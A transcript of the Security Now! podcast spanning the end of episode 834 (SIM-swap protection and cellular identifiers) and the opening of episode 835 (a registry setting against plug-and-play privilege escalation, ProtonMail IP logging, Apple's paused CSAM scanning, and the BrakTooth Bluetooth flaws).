STEVE:  Right.  It's not necessary.  And you might have just thought, eh.  Well, then there is truly nothing protecting your cellular account and your entire life from hostile takeover.  I didn't have to tell her the name of my best friend.  She didn't ask me because I did know my PIN.  Now it's changed.  And if there was ever something that you wanted maybe even changed from time to time, although I've never been a fan of changing passwords, make up four random digits.  Don't have it be something that's meaningful.  And given the general critical weakness of the security of our cellular phone accounts, it might be worth taking a moment to seriously reconsider, as I just have, the value of enabling SMS account recovery for your most critical authentications.  I really did just disable that insecure recovery feature from my password manager, and I feel a bit of relief.  Talk about reducing one's attack surface.



LEO:  A lot of places, though, require it.  Like my bank, there's no way I can turn off SMS authentication.



STEVE:  Then use a bogus number.  I guess, though, they will verify...



LEO:  No, you need it.  They send you the code.



STEVE:  They send a text.



LEO:  So it has to be there.  And it's really frustrating.



STEVE:  I don't know.  Maybe use like a spouse's text.



LEO:  Yeah, or a landline or something, yeah.



STEVE:  Something, so that it cannot be - it cannot receive recovery links.  I mean, but again, our life hanging by a PIN.  It is really insecure.  So T-Mobile calls their SIM-jacking thing, this service they offer, account takeover protection.



LEO:  I turned that on, too.  But it really looks like a come-on for, you know, it keeps you from porting your number and things like that; right.



STEVE:  Yes.  I have a link in the show notes.  You can just google T-Mobile account takeover protection.  AT&T has this under their manage extra security option.  Then look for the wireless passcode section.  And if your carrier's Verizon, you dial *611 and ask to place a port freeze on your account.  Again, as you said, Leo, it is unclear what true security and protection this may afford.  But anything that purports to keep  your phone number associated with its current handset seems worth turning on.  Clearly, the consequences of it being maliciously moved, as we've just seen, can be really devastating.



So I'll just finish with some acronyms.  I titled this "ICCID, IMEI, and IMSI - Oh, My."  While we're on the topic of cellular phones, a review of those wacky long strings of identifier numbers might be in order, especially since the IMEI and IMSI numbers were reportedly part of the T-Mobile breach data.  At least for some subset of the breached subscribers, they are now known.



Okay.  So the ICCID, that is the Integrated Circuit Card ID.  This is a unique and unchangeable international SIM card identifier.  It's the 18- to 22-digit number that can be seen printed on the outside of the SIM, and it smells like the work of a committee that got out of control.  For example, every SIM ICCID begins with the digits 89.  Why?  Well, because this is an industry standard code that indicates that this is a product for use by telecommunications networks.  Now, you ask, but aren't all SIMs for use in telecommunications networks?  Yes, of course.  That's why the number is always 89.  But if it's always 89, then why have it at all?  Exactly.  Ask the committee.  They're quite pleased with their work here.



Following the obligatory and entirely redundant 89, we have one to five digits for the country code.  The U.S. is country code 1.  After the country code is the Mobile Network Code (MNC), which is a string of one to four digits associated with the mobile network operator that issued the SIM card.  This code represents the SIM card's home network.  For example, MNC of 004 is the code for Verizon Wireless.  The ICCID then ends with a guaranteed-to-be-unique-globally string of digits which allows this SIM card to be uniquely identified everywhere for all time.  While it's possible to change the information contained within the SIM, for example including the IMSI, this identity, that is, the identity of the SIM card itself, the ICCID remains fixed at manufacture.



Okay.  Next up, the other one of the three is the IMEI.  That's the International Mobile Equipment Identity.  It's a unique number also immutably assigned to every mobile handset or other cellular-capable device.  And, as with the ICCID, this number is burned into the phone and cannot be changed.  Now, that's, of course, cannot be legitimately changed.  Bad guys can change anything they want to.



And lastly, the IMSI.  This is the International Mobile Subscriber Identity.  And as its name suggests, it's the thing that can be changed as a subscriber's phone number moves from device to device, and thus from SIM to SIM.  It's a unique identifier that identifies a subscriber to the wireless world.  It specifies the country and the mobile network to which the subscriber belongs, and then which subscriber within the network.  So those are the numbers, a bunch of gibberish you can find, in the case of an iPhone, if you go to the Settings and then the General and then About, if you scroll down and find it.  And I read the first two out to the gal on the phone after giving her my PIN, and bingo.  Suddenly my phone number was in a new phone.  Thank god it was a phone I was holding in my hand and not a phone that some bad guy had obtained.  Had he done so, I would have been pretty screwed.  Today, less screwed.  So that's good.



LEO:  Well, as usual during this show I've changed all my settings.  I take your cautions very seriously and act upon them.



STEVE:  I really did.  The idea of an SMS to recover your password manager is the dumbest thing I have ever...



LEO:  Oh, well, I don't use that, thank god.



STEVE:  I had.  I had.  In effect, I thought I had two-factor authentication on.  But I remembered there was some glitch in LastPass at some point where two-factor started having a problem, and so I had disabled it and never went back and turned it back on again. So it's on now, baby.  And I'm glad for it.



LEO:  I use my YubiKey.  And I figure that's got to be as secure as possible.  You'd have to knock me over the head and steal my keys to use that.



STEVE:  Anyway, I just wanted to take this opportunity of this T-Mobile breach and the fact that the PINs got loose to just sort of step back and ask everyone to think about what things have an SMS text message recovery.  Given that it is as flimsy as it is, is that really what you want?



LEO:  Yeah, yeah.



STEVE:  And I think in many cases probably not.



LEO:  Of course I log onto my T-Mobile account, the first thing it says, "Cybersecurity incident.  T-Mobile as determined that unauthorized access to your personal information has occurred, including access to your name, date of birth, driver's license number" - notice how they phrase this - "government identification numbers."  



STEVE:  Uh-huh.



LEO:  "And Social Security numbers.  We have no indication that personal financial or payment information was accessed."  Who cares?  You've got everything else.  "Take action."  And then I did take action, including changing everything.



STEVE:  What is your financial information?  How much your bill was every month for, you know, who cares about that?



LEO:  They didn't get my credit card.  Oh, well, they got everything else.  They can get a credit card in my name.  Well, I've got it all locked down now, thanks to you.  Not just T-Mobile, but all my credit and everything.  I'll never be able to buy another car, but that's okay.  It's probably a good thing.



Steve Gibson, he's the guy.  If you don't listen to this show - well, you do because you're hearing what I say.



STEVE:  They're here.



LEO:  If other people didn't listen, they missed this; right?  And so tell your friends, let them know, this is the show, especially if you're in IT or security or just, you know, you just want to know about this stuff and protect yourself.  This is the place.



Steve's website is GRC.com.  He has the show there.  Actually, you know, the 64Kb audio, but also two unique formats.  A 16Kb audio version, it sounds a little scratchy, but it's small.  And he commissions Elaine Farris to do very nice transcriptions of every episode.  So you can read along as you listen.  You can also search the transcribed version to find a part of the show to listen to.  It's really a nice benefit.  All of that at GRC.com.



While you're there, pick up a copy of SpinRite, 6.0 right now, but soon to be 6.1.  You can hear the gears working.  He's working hard, burning literally the midnight oil.  Well, you probably don't use oil.  But he's burning something at midnight.  And the world's finest mass storage recovery and maintenance utility is still there and is great.  And if you get it now, you'll get an automatic free upgrade to 6.1, as well.  GRC.com.  You can leave him feedback at GRC.com/feedback.  He also takes DMs on his Twitter account.  That is @SGgrc on Twitter.  He has great forums, too, by the way, at his website.



We have the show at our website, TWiT.tv/sn.  We have 64Kb audio and video.  And you can also get it, of course, there's a full-time YouTube channel.  It's full of Steve's Security Now!, all 834 episodes.  You can also subscribe on your favorite podcast client and get it automatically.  Do us a favor, leave a five-star review.  If you do use a podcast client that allows reviews, let the world know.  Tell them.  Say it in the review.  If you missed Episode 834, you're not safe.  Go listen.  Get that information.



Thank you, Steve.  Have a great week.  Put the headphones in the Roku.  Enjoy some TV.  Go to sleep early.  And we'll see you next time on Security Now!.



STEVE:  Okay, buddy.  Bye.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.










GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#835

DATE:		September 7, 2021

TITLE:		TPM v1.2 vs 2.0 

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-835.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at a way of protecting ourselves from Razer mouse-like local elevation of privilege attacks.  We reexamine the meaning of the phrase "Internet Anonymity" following the ProtonMail revelation.  We revisit Apple's now delayed CSAM plans.  We look at some new troubles for Bluetooth and at a popular and persistently unpatched residential security system which can be trivially disarmed by bad guys.  We share some interesting closing-the-loop feedback and a new Sci-Fi discovery.  Then we take a long and careful look at the details and differences between version 1.2 and 2.0 of the Trusted Platform Module specification to discover just what it is that Microsoft wants to insist is available for Windows 11.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Some big stories.  ProtonMail reveals, oh, yeah, after all we do in fact log IP addresses, and we will hand them over to the authorities.  Bit of a shocker there.  A new flaw in Bluetooth that affects pretty much everybody and everything.  And then Steve's going to break down the difference between TPM 1.2 and 2.0 and finally answer the question, why is Microsoft requiring it in Windows 11?  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 835, recorded Tuesday, September 7th, 2021:  TPM v1.2 vs 2.0.



It's time for Security Now!, the show where we cover your security, your privacy, everything you want to know about how the Internet works with this guy right here, our Explainer in Chief, Mr. Steve Gibson.  Hello, Steve.



STEVE GIBSON:  Yo, Leo.  Great to be with you again.  We are first episode of September, which is, being Tuesday, this is the - when we have the 14th, next week, that'll be the latest possible Patch Tuesday occurring in the month.  And it happens  that this is a month anniversary for me.  I've been married to Lorrie for five months.



LEO:  Happy Anniversary.



STEVE:  I woke up this morning, and fortunately I remembered to say "Happy Anniversary."



LEO:  I think on the fifth month it's not exactly critical.  But you'd better remember the first year anniversary.



STEVE:  I would have survived, yes.



LEO:  Yes.



STEVE:  Okay.  We've been talking for the last couple weeks about maybe sort of more the politics of this whole Windows 10 versus 11, 11 needing Trusted Platform Module 2.0.  And I thought, you know, our listeners want some deep dive technology stuff.  So today is TPM 1.2 vs 2.0.



LEO:  Oh, good.



STEVE:  What is the difference?  What is the deal?  What is TPM bringing?  Why does Microsoft appear to feel they need 2.0 for Windows 11, even though 1.2 works fine for Windows 10?  What's the deal?



LEO:  What was that sound?  You can't let that go.



STEVE:  That's one of my many various...



LEO:  What does that one mean?  I have never heard that one, as far as I know.



STEVE:  And it's a good thing you've never heard that one.  That one was GRC's server just crashed and restarted itself.



LEO:  Do you want to take a look and push some buttons?



STEVE:  Oh, no.  We're already back up.  We're in good shape.



LEO:  Well, that's good.  In 17 years I've only heard that once, today, just now.  So that's good.



STEVE:  Yeah.  I have some very old technology which I know what's going on.  I know what the problem is.  And I'm going to have to go back into it when I'm getting it ready to handle the  betas of 6.1, when people who own 6 want to start playing with 6.1 while I'm still working on packaging up into its finished form.  And so in order to make that happen, I'm going to have to tweak the automatic downloading system.  And I know exactly the first thing I'm going to do when I open up the server code is to remove a bunch of crap which it involved sort of the dance we did where we briefly moved people over to SSL, back when that was brief, when they wanted to use ShieldsUP!.



In order to avoid proxies, I would establish an SSL connection to them in order to obtain their actual IP and then allow that to be dropped in order to switch them back to normal HTTP to run ShieldsUP! because of course back once upon a time the world was mostly HTTP.  Well, obviously that's not the case any longer.  But it wasn't hurting anything except that there is this weird edge case with the later version of IIS which doesn't handle some of that correctly.  Like again, very unlikely, but every so often it happens.  It doesn't hurt anything.  Everything's fine.  And basically that's my notice telling me that GRC's net engine just restarted.  Well, the only reason it restarted was that it stopped, and it had to go, you know, ouch.



LEO:  At least it did that automatically.  That's good.



STEVE:  Yeah.



LEO:  I love that sound.  What is the sound?



STEVE:  And, see, you love it.  It just brings a chill to me.



LEO:  Yeah, because you know what it means.



STEVE:  Exactly, exactly.  So it's some horrible siren sound.  There was a time about, boy, what was it now, it was maybe six months ago where it was happening often, and I had to stop working on SpinRite in order to address it finally.  And I'd forgotten.  I told the whole gang in the newsgroup what was going on.  But there was something that I had tracked down, I don't even remember now what it was, that was that cause.  But now there's this other lingering one.  And I'll go and look.  I have like a debug trail, and everything's being captured and snapshotted.  And so after the podcast I'll go look, and I know exactly where it will be in the code.  And it's like, yeah, okay, fine.



But again, it would take me probably - I just don't want to do it until I'm back in the net engine code to implement the changes for SpinRite 6.1 support.  So I'm just, you know, it doesn't - it happened, god, I don't remember when.  Actually I have a log because it actually sends me a text message.  So that's a text message sent by my code to my phone, and then I have that associated with a particular sound on my iPhone.



LEO:  Oh, so the phone made the [mimics sound].



STEVE:  Yeah.  It was the phone itself, yeah.



LEO:  Cool.



STEVE:  Anyway, we're going to talk about TPM 1.2 vs 2.0 at the technical level, like what are the functions it offers, what are the functions of it that Windows uses, and why the difference?  But first we're going to look at a way of protecting ourselves from those Razer mouse-like local elevation of privilege attacks.  We're going to reexamine the meaning of the phrase "Internet anonymity," following the ProtonMail revelation.  We revisit Apple's now-delayed CSAM plans.  We're going to look at some new troubles for Bluetooth and at a popular and persistently unpatched residential security system which can be trivially disarmed remotely by bad guys.  Not what you want in your residential alarm system.



We share some interesting closing-the-loop feedback.  And as I mentioned before we began recording, I wanted to make sure that JammerB, John, knew this, a sci-fi discovery that I just happened upon, I think it was yesterday, when Amazon was showing me some other things I might be interested in.  And I thought, what?  And I didn't know that something had happened that had.  Then we're going to take a long and careful look at the details and differences between v1.2 and 2.0 of the Trusted Platform Module.  So I think a great podcast for our listeners.



LEO:  Lots to talk about, as always.



STEVE:  And Leo, if they don't like it, they can have their money back.



LEO:  No one has yet asked for their money back.



STEVE:  No.



LEO:  So that's the good news.  Well, you had plenty of time to hydrate, Steve, and prepare for...



STEVE:  Thank you for that.



LEO:  ...the Picture of the Week.



STEVE:  Which is not very inspired.  But it just seems apropos.



LEO:  It's apropos, yes.



STEVE:  Yes, of our topic.  For those who are not looking at video, it's just your screen that has a dialog titled "Windows 11 Setup."  And it is declaring this PC can't run Windows 11.  And then there's a little "Here's why" underneath.  And it says:  "The PC must support TPM 2.0."



LEO:  Aha.



STEVE:  Yeah.  And we know lots of people have been seeing that, and it's been annoying.  We're going to be talking about exactly why this is the case at the end of the podcast.



LEO:  Yay.  Yay.



STEVE:  But first, two weeks back, we covered the industry's discovery that the tongue-in-cheek phrase "plug and pray" was more apropos - there's that word again - than we imagined, with the news that plugging a Razer mouse or keyboard into any PC could be used to trivially and locally bypass that system's possibly carefully crafted user privilege restrictions to give the operator full system-level rights.  The worry was that, since this was such a simple mistake to make, that is, for the developers of the mouse driver installation software to make, that it must certainly have also been made elsewhere, and no one had just sort of noticed.



You know, it's like one of those things, you know, like suddenly people, well, it's like when you buy a new car, and suddenly that's all the car that you see on the road.  It's like everyone seems to have that.  How did I not notice that before?  Similarly, now that we have this new thing that we've realized may be pervasive, people are starting to look for it.  And wouldn't you know it, indeed, other similar instances are being discovered.



Okay, now, the good news is that Will Dormann at CERT's Coordination Center has found a registry key that governs Windows' ability to automatically download and run any of those not-explicitly-asked-for-and-executed plug-and-play peripheral installation packages.  Last Tuesday, a week ago, Will tweeted:  "Do you not like the fact that connecting a Razer device auto-runs an arbitrary installer with privileges?  Do you suspect that other devices may be exploitable?  Fear not."  And then he gives a "set" and then a long-looking path to the key in his tweet.  



BleepingComputer posted, and I grabbed from there, thanks to them, a snapshot of the registry with that key open.  Now, okay.  I'll tell you what the key is in a minute.  But let's remember that I'm the guy who left the DNS IP address override in his ecommerce server's HOSTS file, causing its attempted connections to fail when our ecommerce provider's IP address changed, as it certainly had every right to.  In other words, I forgot that I did that, and it came back to bite me.  So this suggests that if I were to make such a change to prevent the auto download and installation of drivers when I plug things into my computer, I might...



LEO:  In three years we're going to do a show where you say Windows Plug and Play never works.



STEVE:  It's crap, Leo.  I'm plugging this thing in all day, and nothing is ever happening.



LEO:  This is probably not the perfect fix for this.



STEVE:  Well, yes.  What you'd like would be a little pop-up dialog where you would say, "Hi, we'd love to install this for you, but you need admin rights for that to happen.  Got any?"  Anyway, so instead it just, like, nothing happens.  So the point being that we both just made to be clear about it is that we might forget that we had disabled this automatic device driver download and installation.



LEO:  Which is really hideously useful.  I mean, let's face it.



STEVE:  Yes.  Yes, yes, yes.



LEO:  We count on that.  How many times have you plugged in a USB device and heard "bing-bong," and then, you know, "boom-boom" as it installs, and you...



STEVE:  Right.



LEO:  But you do usually see a little pop-up in the registry.



STEVE:  Well, yeah.  And if you're able to click on your little installing device driver thing down in the tray, you'll see this little whatever it is, spinning or doing something, it's like, we're polishing your Windows.  And maybe you'll be able to see something pretty soon like your icons.  That would be nice.  Anyway, so I'm just saying, okay.  For anyone, probably those with enterprise IT management responsibilities, who is interested, the details are in the show notes.  And for anyone who's comfortable with the Windows registry, there's nothing to it.  I mean, it's simple to do.  You go to HKEY_LOCAL_MACHINE, then SOFTWARE > Microsoft > Windows > CurrentVersion > Device Installer.  Now, on my machine, that key existed, but it had no names and values associated with it.  It was blank.  But it was nice to see it was there.  So you'll be able to find it.



Once you're there you create a REG_DWORD value named "DisableCoInstallers."  If you want to do this all by audio of the podcast, with the D of Disable, the Co of Co, the C capitalized, and Installers capitalized.  I don't remember whether registry names are case-sensitive.  They may not be.  Values tend to be, but maybe not the names.  Anyway, DisableCoInstallers as all one string with D, C, and I capitalized, and set its value to 1.  Which, as its name suggests, disables coinstallers.  And now, probably after you reboot, when you plug something in, your system will no longer run off to go download it and run it.



So again, the danger is that someone will forget that this was done and be puzzled when things don't work automagically as expected.  But in many settings that might be exactly what's desired.  So I did want to share with our listeners who may be responsible for machines whose users cannot be fully trusted that this option is there.  And I agree with you, Leo, be nice...



LEO:  Lot of businesses you don't want plug-and-play running anyway. 



STEVE:  Unh-unh, no.



LEO:  Because somebody could have a malicious USB key.  There's all sorts of side effects, yeah.



STEVE:  Yeah.  So I wish that the phrase "Internet anonymity" were not an oxymoron.  Any longtime follower of this podcast would have seen example after example, because we've covered them in the last 16-plus years, of the truth that while the Internet can make tracking people much more difficult, it's still not impossible.



This is why over the years we've developed the model of having two people who really wish to hold a private conversation strip down to their shorts and walk out into the middle of Central Park with no one around, carrying a large and thick quilted comforter blanket.  They then throw the blanket over themselves, then whisper as quietly as possible, so that they're barely audible, into each other's ear in order to exchange secrets.  That's about as low-tech as anything could possibly be, which is exactly the point.  Technology provides vast measures of convenience, but that convenience always comes at the cost of some bit of security.  Maybe not a lot.  Maybe a lot.  Who knows?  Anyway, in the doghouse this week is ProtonMail.



LEO:  Oh, yeah.



STEVE:  And I know a lot of our listeners are ProtonMail users.  My Twitter feed is full of people saying, "Hey, talk about ProtonMail, Steve.  Tell us how wonderful it is."  And "I'm using it, and I think it's great."  So, okay.  What's really cool, Leo...



LEO:  You know what I've said to everybody, and I'm vindicated now.  Email is inherently insecure, period.



STEVE:  Yes.



LEO:  Don't kid yourself.



STEVE:  What's cool is they got caught, and I've got it in the show notes, changing their website.  So they boast on their website secure email based in Switzerland.  But that statement's meaning was changed last week.  I just scrolled down through their home page at ProtonMail.com.  And, oh, boy.  It looks wonderful.  The Hacker News...



LEO:  You made fun of it when it came out because you mentioned the Swiss server in the mountain.  Remember that?



STEVE:  Yes, yes.  Yeah.  So the Hacker News writes that:  "On its website, ProtonMail advertises that:  'No personal information is required to create your secure email account.  By default, we do not keep any IP logs which can be linked to your anonymous email account.  Your privacy comes first.'" Unquote from them; unquote from the Hacker News.  But when I just went to that page and searched for bits of that assertion, that statement, it had apparently been removed.  I wonder why?  Could it perhaps be because it was recently discovered that ProtonMail had provided location information to Swiss authorities which directly led to the arrest of one or more of the users of their supposedly Swiss identity-protecting service? Yeah, that might have been a factor.



The Hacker News captured a "before" screenshot of ProtonMail's homepage.  Right at the top it lists its main feature categories as:  "Swiss Privacy," "End-to-End Encryption," and "Anonymous Email."  But it doesn't say that today.  Their homepage has been changed.  Today, the top line still begins with "Swiss Privacy" and "End-to-End Encryption."  But now the third item is "Your Data, Your Rules" where it previously said "Anonymous Email."



Now, I give them some serious props for 'fessing up and apparently thinking, okay, we really can't make that Anonymous Email claim anymore, can we.  You know.  That had to hurt.  Because I know these guys' heart is in the right place.



LEO:  I feel bad for the French climate activist who believed them and is now in jail.



STEVE:  Yup.  ProtonMail acknowledged that it had received a "legally binding order from the Swiss Federal Department of Justice" related to a collective called Youth for Climate, which it was "obligated to comply with," compelling it to hand over the IP address and all information it had related to the type of device used by the group to access the ProtonMail account.  Hmm. That's probably not the nature of the protection that those users of ProtonMail believed they were receiving after reading ProtonMail's original, quite powerful and compelling privacy-expounding home page - which, as I've noted, no longer exists.



So despite its no IP logging claims, the company acknowledged that, while it's illegal for the company to comply with requests from non-Swiss law enforcement authorities, it will be required to do so if Swiss agencies agree to assist foreign services such as Europol in Europol's investigations.  In part of a lengthy response posted on Reddit, the company said:  "There was no possibility to appeal or fight this particular request because an act contrary to Swiss law did in fact take place, and this was also the final determination of the Federal Department of Justice which does a legal review of the case."



Put simply, ProtonMail will not only have to comply with Swiss government orders, it will be forced to hand over relevant data when individuals use the service to engage in activities that are deemed illegal in the country. This includes monitoring its users' IP addresses.  ProtonMail's founder and CEO Andy Yen tweeted:  "Proton must comply with Swiss law.  As soon as a crime is committed, privacy protections can be suspended, and we're required by Swiss law to answer requests from Swiss authorities.  It's deplorable" - this is his tweet.  "It's deplorable that legal tools for serious crimes are being used in this way.  But by law we must comply with Swiss criminal investigations.  This is obviously not done by default, but only if legally forced."



LEO:  I have to say that seems to me disingenuous because they were saying "We don't log IP addresses.  We don't preserve that information."  If they had received a warrant for information they didn't have, they wouldn't have to hand it over.  So they were misrepresenting what they were doing.



STEVE:  Well, unless the warrant said...



LEO:  Start logging, yeah.



STEVE:  Yes, exactly.  So...



LEO:  Now, at that point Swiss law requires they notify the subject.



STEVE:  Ah.



LEO:  So that's again another question mark.  At that point they're supposed to tell the subject we are now monitoring your login.  Did they do that?  You know, this is never - and this is independent of whether they're encrypting email or not.



STEVE:  Yeah, yeah, yeah, agreed.



LEO:  Of course they're encrypting it.



STEVE:  Oh, yeah.  Absolutely end to end.  We believe that.



LEO:  End to end if the other person is going to do it with you.  I mean, you know...



STEVE:  Right.



LEO:  You can't send an encrypted email across the public Internet.  You can only send a link saying there's an encrypted file for you.  Or, you know, you can come unencrypt it, something like that.



STEVE:  Sure.



LEO:  Because Gmail doesn't know how ProtonMail works.  Gmail wouldn't know what to do with it.



STEVE:  What I'm wondering, you know, because, I mean, they're loudly talking about this service.  The entire reason people use ProtonMail is to get the protection that, you know, they used to claim "anonymous email."  So, I mean, it does seem to me like maybe their technology's not working right, but that their heart's in the right place.  Their business is to offer, to the degree they can, absolute privacy.  But they're certainly correct in explaining that, if they have the ability to comply with such requests, they must by law do so.



LEO:  They have no choice.  Yeah.  Same with Apple.  Same with everybody else.



STEVE:  Yes.  Exactly.  Exactly where I'm going with this, Leo.  What I wonder is whether it wouldn't be possible for them to design a system where it's just not possible for them to comply, no matter how much they might be forced to.  And then for example, to the point you just made, we conjectured here that one possible motivation for Apple's quite unpopular plan to compare photo signatures against a known photo signature database before uploading new photos to iCloud might actually be so that they could further lock down iCloud as they have their other end-to-end encrypted systems.  In other words, make it impossible for them to comply to such a request.  And where there's a will, there's a way.



So ProtonMail users who are concerned about the visibility of their IP addresses I think should also take the trouble to route their access through the Tor network to obtain additional anonymity.  Since email is not real-time communications anyway, routing email through Tor, which adds significant communications latency on its own because you've got to bounce through all these nodes and have onion wrappers unwrapped, to me that makes a lot of sense.  But presumably that isn't something that these guys thought they had to do because they were being told that their IP address was not being logged.



We don't know the details of whether they were told, you know, forced to start logging, or whether maybe they actually were logging and deleting them, quietly keeping a log, but never intending to publish it.  Or maybe they understood that they did have an obligation to comply with Swiss law and were actually logging.  We don't know.



LEO:  We don't know.



STEVE:  But speaking of Apple's client-side image matching, for those listeners who don't already know, Apple has announced that it will be pausing the planned rollout of its quite controversial plan, which as we know screens users' devices for child sexual abuse material, so-called CSAM.  As we know, Apple received substantial and sustained pushback, not only over worries that the technology could be weaponized for mass surveillance and erode the privacy of their users, but just over the "ick" factor, at the idea of having anything to do with this kind of material being preloaded into all iOS devices which are capable of uploading images to iCloud.  People just didn't like it.



So what Apple wrote, they said:  "Based on feedback from customers, advocacy groups, researchers, and others, we have decided to take additional time over the coming months to collect input and make improvements before releasing these critically important child safety features."



So they're not suggesting that somehow this problem doesn't still need to get solved.  As has been noted, other services which are performing this kind of image matching are discovering a horrendous amount of illegal content, which is what this stuff is.  So as you guys did on MacBreak Weekly, I give Apple credit for publishing their intentions to develop and use this technology well ahead of their planned incorporation of it into iOS 15, and then listening to and responding to all the blowback that they received.  Of course the trouble is from a technology standpoint, you know, it's pretty much binary.



So I wonder what Apple's going to do.  Either you do it this way or you don't do it this way.  They're saying, well, we're going to review and think about this some more.  But if their underlying motivation was actually to somehow arrange to lock down iCloud in an end-to-end encrypted fashion, which we know they haven't yet, they might be able, again, under the "where there's a will, there's a way," they might be able to do that by, as I know Rene had previously suggested, by somehow offloading the image analysis to an intermediate cloud-based service which would perform the signature comparison, and then would encrypt the image on behalf of the image's iOS user for then permanent storage on iCloud.



And this might mean that they need to go back to the drawing board and work a bit harder at coming up with a solution that both matches the needs of their users, which arguably what they were proposing did not due to the outcry, yet still offer, you know, come up with a technologically sound way of doing the image verification that everybody else is doing, while also arranging not to be able to decrypt it once it's been submitted to iCloud.



LEO:  So just because I know you'll get emails, I'm going to clarify. 



STEVE:  Ah, good.



LEO:  Save you from Twitter storms.  At no point were those images ever transmitted.  The only place in the country that can legally store those images is NCMEC, the National Center for Missing and Exploited Children.  It was founded by the U.S. government, funded by the U.S. government.  It's a nonprofit.  But law allows it and only NCMEC to keep those images.  NCMEC generates the fingerprint, the neural hash.



STEVE:  Right.



LEO:  That's the only thing that was loaded on your phone is that neural hash.



STEVE:  Right.



LEO:  So Apple's using the process, which was developed by Microsoft, by the way, to compare that neural hash of the image that you have on your phone to that neural hash from NCMEC.  So I think everybody does it.  Even Apple has been doing it to email attachments.  Google does it to Gmail attachments.  Google, Dropbox, Facebook, Microsoft all do it on their cloud storage.  



STEVE:  Right.



LEO:  I think if Apple had said, "We're going to do it on your cloud storage," that would have been fine.  But as you point out, you could not then have end-to-end encrypted cloud storage because Apple would have to access your images.  So I think that they were trying to make it still possible to do end-to-end iCloud by putting the fingerprints on your phone, having your phone do the comparison, and then all the phone does at that point is generate a voucher.



STEVE:  Yup.



LEO:  And after 30 vouchers are generated, it then sends the images to Apple for verification, which is a little creepy, and then on to NCMEC to report you.  So there's no "ick" factor in a sense that you have those images on your phone.  You don't.



STEVE:  Correct.



LEO:  I think the "ick" factor was people don't want Apple to be doing stuff on your phone, scanning your images for anything.  Right?



STEVE:  Right.



LEO:  I don't - would anybody object, I mean, we're already - Dropbox does it.  Facebook does it.  There are [crosstalk].



STEVE:  Well, and of course the other point was it was only those images which were being submitted to iCloud, also.  So if you turned off iCloud...



LEO:  Right, you can turn that off.



STEVE:  ...photo backup, then...



LEO:  No problem.



STEVE:  We're back the way it has been.



LEO:  And I would presume that the evil entities that are doing this already know you don't send it as an email attachment.  You don't store it on a cloud service.  And now they know turn off Apple's iCloud.  As if they were turning it on in the first place.



STEVE:  Right.  



LEO:  I think it's a little disingenuous of Apple to imply that they're doing anything to stop CSAM.  This is a sop to law enforcement so that they could turn on, I think, end-to-end encryption on iCloud.



STEVE:  Well, yes, because what do we hear is law enforcement brings out the kiddie porn issue whenever the issue of encryption comes up, saying, well, if you're encrypting everything, then this is going to be abused by child pornographers.



LEO:  And terrorists, yeah.



STEVE:  Yes. 



LEO:  And I think honestly at some point, you've already said this, Apple's going to have to some way give in.  Everybody's going to have to some way give in to law enforcement.



STEVE:  I think that's where we're headed, yeah.



LEO:  They're going to be forced to.  I mean, Australia, Canada, England.  Canada's got a very draconian anti-encryption law about to be enacted.  It's going to happen.  And if it happens there, it'll happen here eventually.



STEVE:  Yeah.



LEO:  All right.  I just wanted to make sure - because I don't want anybody to think that Steve thinks they're putting child pornography on your phone.  He doesn't think that.



STEVE:  Right.  And we covered this extensively, of course, over the last two weeks before.



LEO:  Yeah, yeah, that's how I know it.



STEVE:  So if I misspoke, I'm glad you grabbed that and corrected it, Leo.  Thank you.  Oh, Leo, Bluetooth has new troubles.



LEO:  Oh, yes, saw this.  Oh, god.



STEVE:  God.  A new set of attacks are known as "BrakTooth," "brak" being Norwegian for crash.  Paraphrasing from the discoverer's disclosure, they explain.  They said:  "Bluetooth Classic protocol is a widely used wireless protocol in laptops, handheld devices, and audio devices.  In the past few years, Bluetooth has come under scrutiny due to the discovery of several critical vulnerabilities.  In this report, we disclose BrakTooth, a family of new security vulnerabilities in commercial Bluetooth stacks that range from denial of service via firmware crashes and deadlocks in commodity hardware to arbitrary code execution in certain IoTs," you know, Internet of Things.



"As of today," they wrote, "we have evaluated 13 Bluetooth devices, meaning core chip things, not actual products, 13 BT devices from 11 vendors.  We have discovered a total of 16 new security vulnerabilities, with 20 common vulnerability exposures (CVEs) already assigned, and four vulnerabilities are pending CVE assignment from Intel and Qualcomm.



"All the vulnerabilities are already reported to the respective vendors, with several vulnerabilities already patched" - that's of course, you know, from now on out - "and the rest being in the process of replication and patching.  Moreover, four of the BrakTooth vulnerabilities have received bug bounties from Espressif System and Xiaomi.  An exploration of Bluetooth listings reveals that BrakTooth affects over 1,400 product listings.  BrakTooth exposes fundamental attack vectors in the closed" - and I'll get to that in a second - "Bluetooth stack.



"As the Bluetooth stack is often shared across many products, it is highly probable that many other products, beyond the approximately 1,400 entries observed in Bluetooth listings, are affected by BrakTooth.  Therefore, we suggest vendors producing Bluetooth system-on-chips (SoCs), Bluetooth modules, or Bluetooth end products use the BrakTooth proof-of-concept code to validate their Bluetooth stack implementation."  In other words, you know, basically a fuzzing attack against Bluetooth.  They conclude:  "The availability of the BrakTooth proof of concept is discussed at the end of this report."



Okay.  So here again we have a problem with the way we're still doing technology, like with the idea that we're going to use and trust proprietary voting machines.  You know, similar kind of problem.  In both the Bluetooth and the voting machine cases, a closed system must be trusted to do the right thing while its not doing the right thing can have sweeping consequences for millions of people.  Yet we just shrug.  "Oh, darn."



So we already know that opening everything up doesn't by itself automatically make everything secure.  So while it's not sufficient, it is almost necessary, I would argue.  To my mind, this is the single most compelling reason to push for opening our technologies.  And Leo, I know you're on the same channel as I am with this.



